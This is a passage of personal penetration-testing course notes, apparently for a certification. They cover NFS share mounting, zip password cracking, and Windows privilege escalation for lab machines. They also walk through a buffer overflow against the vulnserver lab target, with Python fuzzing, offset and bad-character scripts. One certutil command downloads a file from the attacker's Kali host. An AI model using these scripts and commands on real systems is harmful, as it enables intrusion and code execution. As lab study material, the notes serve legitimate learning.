integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b4e73e46-9444-44fb-aba2-6c979dce6843" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">showmount -e &lt;target ip&gt; = to show file shares / mount drivers
mkdir mnt/&lt;name&gt;
mount -t nfs &lt;target ip&gt;:&lt;path that show in showmount&gt; /mnt/&lt;name&gt;

# -t = type

# the path of the share &gt; the path that we will send the mounted share
</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a5d5e96-098b-4e73-9afd-5463c2c751c5" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">fcrackzip = tool to crack zip files that have passwords:
# -v = verbose
# -u = unzip
# -D = dictionary attack
# -p = wordlist file
# &lt;the output file&gt;
</code></pre><h3 id="701ffbbc-d871-4f4d-a6e4-2eedb0e5283e" class=""><strong>Butler</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#butler"></a></strong></h3><p id="1b03ff01-178a-4167-b228-c3e34c0ddeae" class=""><strong>Grab files in windows</strong>: after open a server</p><p id="2c7c5997-6731-4ec0-a42b-efc05c00d4fd" class="">Example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d99e5e96-05f1-4d8c-88c1-102472cfbf90" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">python3 -m http.server

certutil.exe -urlcache -f http://&lt;kali ip&gt;/&lt;file&gt; &lt;output file&gt;
</code></pre><p id="24cd76a2-75d8-4f9c-92a7-22ab52d0fe70" class="">After winPeas:</p><p id="43a9d917-43e4-4c18-8146-2a59d501a09d" class=""><strong>Unquoted service path</strong>: Means that in file register of windows, it need to have quoted path in executable files, and sometimes that is not set in the machine.</p><p id="c086b8b3-4493-4cc1-82b4-08494ffcd64c" class="">Example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f47b5ecb-fff9-4a62-bf3c-3ce213629d30" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">insecure ImagePath = C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe
secure ImagePath= &quot;C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe&quot;
</code></pre><blockquote id="c925dd96-a32e-460a-9713-91a64718d64a" class="">When the service is unquoted, windows check for exe files in every space break!</blockquote><ul id="c1a75509-df32-4ea4-a64e-7943cebb7791" class="bulleted-list"><li style="list-style-type:disc">If we have write permissions,</li></ul><ul id="317088b1-1828-4a3f-b844-8b5d8e67cf1f" class="bulleted-list"><li style="list-style-type:disc">we can put a malicious file ‘for’ example in ..\Wise\Wise’.exe’, that should be executed.</li></ul><p id="e6265576-c6ef-478f-9916-3ae795dfccea" class=""><strong>To stop a service in Windows</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bbd601d8-65ee-4f60-8959-47cd2e3e124a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">sc stop &lt;service&gt; = to stop
sc query &lt;service&gt; = to show status
sc start &lt;service&gt; = to start
</code></pre><h3 id="924b81cd-6518-45bb-be2c-4457c3446783" class=""><strong>BlackPearl</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#blackpearl"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="784dd6a2-78f2-442f-871e-00f7dca2c13d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">dnsrecon -r &lt;range 127.0.0.0/24&gt; -n &lt;target ip&gt; -d &lt;anything&gt;
ffuf -w &lt;wordlist&gt;:FUZZ -u &lt;url&gt;/FUZZ

find / -type f -perm -4000 2&gt;/dev/null
GTFObins = to abuse SUID
</code></pre><h1 id="e5a1efde-2ee8-462d-bcf2-a853c83d56d1" class=""><strong>Buffer Overflow</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#buffer-overflow"></a></strong></h1><ul id="5413199f-a0cc-43a0-84ef-a8b0cdf1c899" class="bulleted-list"><li style="list-style-type:disc">Installed w10 enterprise:<p id="54747752-11ad-4428-9a37-519d2f8cccd8" class="">https://www.microsoft.com/pt-br/evalcenter/evaluate-windows-10-enterprise</p></li></ul><ul id="9121f87a-381b-4497-8922-eb5ff0270656" class="bulleted-list"><li style="list-style-type:disc">Immunity Debugger 1_85:<p id="d90fa825-0d38-417e-9bd1-d925733fd24a" class="">https://www.immunityinc.com/products/debugger/</p></li></ul><ul id="3d7cbf5a-49a5-4f10-a5cf-5d13b6446035" class="bulleted-list"><li style="list-style-type:disc">vulnserver_master.zip:<p id="b4735964-5934-4517-98cd-2551ad2460f6" class="">http://www.thegreycorner.com/p/vulnserver.html</p></li></ul><ul id="42dea242-7cb0-4ce3-a5a0-156b1fbc5594" class="bulleted-list"><li style="list-style-type:disc">Installed W10 in a VM:<p id="794fd782-25fc-4330-8244-623ab3e95f7c" class="">NAT network</p><p id="f1af8981-f707-40bf-be3e-13b42612cb9f" class="">Dont forget to turnoff windows defender and firewall</p></li></ul><h2 id="fcb2a6d4-7cba-49c4-b244-d254f4b111c6" class=""><strong>Anatomy of Memory</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#anatomy-of-memory"></a></strong></h2><table id="495f4a5e-ac40-4f66-b560-b44b9f118a0f" class="simple-table"><tbody><tr id="59232618-6417-425a-a828-07de8726f654"><td id="^|US" class="">Kernel</td><td id="CTV`" class="">11111</td></tr><tr id="e89c1089-5683-492c-be1c-04904e40d8ce"><td id="^|US" class="">Stack</td><td id="CTV`" class="">&lt;’we are gonna focus in here’&gt;</td></tr><tr id="cfb597a6-f880-4feb-bf87-ee47a4d64d6b"><td id="^|US" class="">Heap</td><td id="CTV`" class=""></td></tr><tr id="71960755-7882-4912-a5e6-5d315e10526d"><td id="^|US" class="">Data</td><td id="CTV`" class=""></td></tr><tr id="6067149b-22ed-4a65-81f5-79601ea18998"><td id="^|US" class="">Text</td><td id="CTV`" class="">00000</td></tr></tbody></table><h2 id="f510d61a-1d1f-4f82-be7c-e7aaa92d5139" class=""><strong>Anatomy of Stack</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#anatomy-of-stack"></a></strong></h2><table id="60100d8b-f14c-4b34-9807-b1ffa7209d63" class="simple-table"><tbody><tr id="d4c6ac3a-0262-4a54-86bb-ff01c490d947"><td id="bzGW" class="">ESP</td><td id="D;?k" class="">(extended stack pointer)</td></tr><tr id="918fb059-6d8e-4eaa-b46a-bbb9322a0583"><td id="bzGW" class="">Buffer Space</td><td id="D;?k" class=""></td></tr><tr id="8584557d-1df2-47e4-92e8-bed936b541e8"><td id="bzGW" class="">EBP</td><td id="D;?k" class="">(extended base pointer)</td></tr><tr id="d573baeb-7df4-4cf5-9dd4-98724db5527c"><td id="bzGW" class="">EIP</td><td id="D;?k" class="">(extended instruction pointer) / return address.</td></tr></tbody></table><blockquote id="ae9ee0db-42b4-4511-9692-d1642464d573" class="">Basically, We are gonna inject code to the top of the stack ESP</blockquote><blockquote id="1fb90ceb-0abb-4fbd-89fb-0e5c7e66c0ad" class="">Until the code surpass the bottom and reach the EIP</blockquote><blockquote id="a437db3e-0a35-4280-b0b3-0e777f624d3d" class="">That is where we control the return address, to gain reverse shell or whatever suits us.</blockquote><h2 id="22aabbd7-daa5-49b2-962d-f88dd74eae5d" class=""><strong>Spiking</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#spiking"></a></strong></h2><p id="e4fdbba4-c538-4db2-8ed1-aa7ed7caa104" class="">192.168.0.11 172.16.127.128</p><p id="b4ff6f4e-2e8c-4f12-ae6b-95a6e2807dc2" class="">After connecting to the vulnserver:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6cfc45b9-cf25-42e7-b1fb-621591ba8e76" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">nc -nv &lt;target ip&gt; &lt;port&gt;
</code></pre><p id="d967759c-d84d-4f82-93d9-f63cd3583c63" class="">we type HELP = to see all possibles valible commands</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="99659819-147b-4c22-8017-f2b9594d6a13" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">HELP

Valid Commands:
HELP
STATS [stat_value]
RTIME [rtime_value]
LTIME [ltime_value]
SRUN [srun_value]
TRUN [trun_value]
GMON [gmon_value]
GDOG [gdog_value]
KSTET [kstet_value]
GTER [gter_value]
HTER [hter_value]
LTER [lter_value]
KSTAN [lstan_value]
EXIT
</code></pre><ul id="2e2e6e9c-b17f-4005-919b-c68cbf4670ce" class="bulleted-list"><li style="list-style-type:disc">The spiking process is to test by sending caracteres and recon every command to see which is vulnerable</li></ul><ul id="f430ae5f-7691-4dac-af8e-42719865329e" class="bulleted-list"><li style="list-style-type:disc">So we have to test each one of them stats, rtime, ltime etc</li></ul><ul id="249a793c-b79d-446c-90ba-bc25ab2e6124" class="bulleted-list"><li style="list-style-type:disc">For this usage, we know that the vulnerable is the <strong>TRUN</strong></li></ul><h3 id="63d0d038-af6d-492b-bcce-837f0c2950aa" class=""><strong>generic_send_tcp trun.spk 0 0</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#generic_send_tcp---trunspk-0-0"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4113963f-2b39-4dc4-8f20-ba6b254d76b6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&#x27;mkdir stats.spk&#x27; s_readline(); s_string(&quot;STATS &quot;); s_string_variable(&quot;0&quot;);
</code></pre><p id="84dcbee4-2169-408b-bc7e-bf88e94fe05d" class="">we just change the ‘s_string’ to the process we wanna to test ‘mkdir trun.spk’ s_readline(); s_string(“TRUN “); s_string_variable(“0”);</p><ul id="2e06b4d6-9c2b-43c6-b16c-204d57de9613" class="bulleted-list"><li style="list-style-type:disc">When we send the spiking script, the vulnerable application should crash</li></ul><ul id="4e2600bd-2995-4e93-bc8c-6f62fb683a2f" class="bulleted-list"><li style="list-style-type:disc">And in the Registers we should see <strong>ESP</strong>, <strong>EBP</strong> and <strong>EIP</strong> overflowed with <strong>AAA</strong> or <strong>414141</strong></li></ul><blockquote id="146faf6e-f505-4fef-bdb9-1b92dd22c541" class="">41 is the hexdecimal of A</blockquote><h2 id="6c4a5f30-90e6-4de2-a80f-6c38fc2a1810" class=""><strong>Fuzzing</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#fuzzing"></a></strong></h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="12b73b6c-ddc4-4c73-8951-9547b10a44ec" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">#!/usr/bin/python

import sys, socket
from time import sleep

buffer = &quot;A&quot; * 100

while True:
  try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((&#x27;172.16.127.128&#x27;,9999))

    s.send((&#x27;TRUN /.:/&#x27; + buffer))
    s.close()
    sleep(1)
    buffer = buffer + &quot;A&quot; * 100
  except:
    print &quot;Fuzzing crashed at %s bytes&quot; %str(len(buffer))
    sys.exit()

</code></pre><p id="b23e73b3-9acd-4ebc-b985-745db96703cd" class="">After running, it crashed the application and show us where aproximately it crashed:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5abb581e-6543-4c0e-a400-e6c78f928673" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">python fuzz.py
^C Fuzzing crashed at &#x27;2400 bytes&#x27;
</code></pre><blockquote id="e8d1ecf0-03b2-4804-9c4a-2be7f11b7604" class="">If I remember correctly we need to sum 400 bytes, so in 2800 we could overflow the EIP</blockquote><h2 id="7deb0a42-e15f-4912-b846-667087f410a7" class=""><strong>Finding the Offset</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#finding-the-offset"></a></strong></h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ca9ccdfb-f0a8-4b57-a1fb-2b05c884a4e5" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2800
# -l = length that we found fuzzing
</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ae5b90ee-3f65-4df9-b3be-bd25d00a6627" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">#!/usr/bin/python

import sys, socket

offset = &quot;&quot;

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect((&#x27;172.16.127.128&#x27;,9999))
  s.send((&#x27;TRUN /.:/&#x27; + offset))
  s.close()
except:
  print &quot;Error connecting to server&quot;
  sys.exit()

</code></pre><ul id="234bc4c5-d702-4c6c-bdde-8002dfd43c5b" class="bulleted-list"><li style="list-style-type:disc">So we will generate the payload length with <strong>pattern_create</strong></li></ul><ul id="4f0125b4-54ba-441e-971e-3465ed932c31" class="bulleted-list"><li style="list-style-type:disc">And copy the result in the offset variable</li></ul><ul id="08671743-96f9-495b-b1a5-64032a712d58" class="bulleted-list"><li style="list-style-type:disc">Its supose to crash the application - great</li></ul><p id="425f3bcd-6414-4ccb-af6a-c17d7396a888" class="">Now we run:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5d66253c-b08f-4981-bfc5-cd3b1159cc8b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2800 -q 386F4337
# -l = length
# -q = the value we found in EIP after the crash
</code></pre><blockquote id="a4c95e8f-c941-4f6e-892d-10b428f81a1c" class="">Exact match at offset 2003</blockquote><h2 id="6ae0819a-d937-4688-9c05-55f819441702" class=""><strong>Overwriting the EIP</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#overwriting-the-eip"></a></strong></h2><blockquote id="87082597-a9c3-4282-857b-092d39117640" class="">We discover the offset at 2003 that run before the EIP that is 4 bytes</blockquote><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3696833c-1919-48e9-adf7-b21e3b1107ad" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">#!/usr/bin/python

import sys, socket
offset = 2003
shellcode = &quot;A&quot; * offset + &quot;B&quot; * 4

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect((&#x27;172.16.127.128&#x27;,9999))
  s.send((&#x27;TRUN /.:/&#x27; + shellcode))
  s.close()
except:
  print &quot;Error connecting to server&quot;
  sys.exit()

</code></pre><ul id="6bfd8407-69b4-4287-a84c-dabd232d16d7" class="bulleted-list"><li style="list-style-type:disc">We modified the last script with the found value of offset before the application break</li></ul><ul id="d8041fcb-23b8-4b3f-8986-d075d923ed93" class="bulleted-list"><li style="list-style-type:disc">And we will execute <strong>B</strong> in those 4 bytes reserved for the <strong>EIP</strong></li></ul><ul id="288e044c-b69a-48a3-9715-d08dcd85ec92" class="bulleted-list"><li style="list-style-type:disc">So the result should crash the application again</li></ul><blockquote id="977185c1-d5d0-49b5-a9d1-db435f342114" class="">However, the value of EBP is 414141 and the value of EIP should be equal to 42424242 = “B”*4</blockquote><h2 id="33592f8f-9c86-4a69-98b9-b64a7a53c9f7" class=""><strong>Finding Bad Characters</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#finding-bad-characters"></a></strong></h2><p id="a8a32c92-cfdd-499d-abfe-ff4475f6faa5" class="">→ https://github.com/cytopia/badchars</p><blockquote id="06b2a20d-8500-4230-ae24-bcd8e22d59b6" class="">We are gonna add the badchars variable to our script and add in the shellcode variable also</blockquote><p id="900a91b2-2e24-485c-b9e9-376e74d771ee" class="">Like this:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="49f1dbf5-3a28-4356-85f5-a24fdc1264e1" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">#!/usr/bin/python

import sys, socket

badchars = (
  &quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot;
  &quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot;
  &quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot;
  &quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;
  &quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot;
  &quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot;
  &quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot;
  &quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot;
  &quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot;
  &quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot;
  &quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot;
  &quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot;
  &quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot;
  &quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot;
  &quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot;
  &quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;
)

offset = 2003
shellcode = &quot;A&quot; * offset + &quot;B&quot; * 4 + badchars

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect((&#x27;172.16.127.128&#x27;,9999))
  s.send((&#x27;TRUN /.:/&#x27; + shellcode))
  s.close()
except:
  print &quot;Error connecting to server&quot;
  sys.exit()

</code></pre><ul id="eece3b2f-81a5-44f7-aa90-c7521f5483b8" class="bulleted-list"><li style="list-style-type:disc">This time go to Immunity Debugger &gt; register &gt; ESP &gt; follow in dump</li></ul><ul id="2b64b94b-be16-4e91-87b8-f236c8df358d" class="bulleted-list"><li style="list-style-type:disc">And try to find the badchars in the hexdump</li></ul><h3 id="08458534-93bc-46eb-8797-bf25d1ed7797" class=""><strong>How to find Bad Chars?</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#how-to-find-bad-chars"></a></strong></h3><p id="1ddd4931-0540-46a6-85ef-af092cecc24d" class="">Hex example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="133f651b-e1f4-485f-a296-7bd44583a210" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">01 02 03 &#x27;B0 B0&#x27; 06 07 08
09 0A 0B 0C 0D 0E 0F 10
